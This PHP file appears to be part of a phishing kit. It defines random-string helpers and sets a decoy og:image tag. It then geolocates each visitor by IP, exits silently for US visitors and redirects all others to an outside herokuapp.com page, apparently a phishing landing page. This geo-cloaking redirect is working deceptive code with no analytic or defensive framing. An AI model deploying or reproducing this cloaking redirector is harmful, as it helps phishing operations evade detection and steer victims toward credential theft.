<?php
  function md5rand($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="0123456789";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }
      function shkronja($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val)
    {                                                                     
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }                                                         
    return $pass;
    }

    ?>
<meta property="og:image" content="https://google.com" />
<?php

 




{
$randval = rand();
include("geoip.inc");
$ip=$_SERVER['REMOTE_ADDR'];
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);

$country_code = geoip_country_code_by_addr($gi, "$ip");

// Country name is not used so commented
// Get Country Name based on source IP
//$country = geoip_country_name_by_addr($gi, "$ip");

geoip_close($gi);

switch($country_code)

    {

          case "US": exit(); break;


              default: header("Location: https://kompj2.herokuapp.com/1.php");
}



                                 


}





?>
